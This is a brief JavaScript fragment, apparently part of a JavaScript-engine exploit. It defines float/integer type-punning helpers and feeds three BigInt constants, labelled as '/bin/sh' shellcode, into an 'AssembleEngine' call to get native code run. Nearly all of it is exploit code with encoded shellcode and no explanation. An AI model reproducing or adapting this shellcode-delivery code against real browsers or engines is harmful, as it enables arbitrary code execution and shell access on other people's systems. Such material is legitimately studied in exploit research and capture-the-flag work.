// helper functions
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }
// /bin/sh shellcode
AssembleEngine([7593684403119126065n,6869207039721025390n,5562984099575n].map(v=>itof(v)));
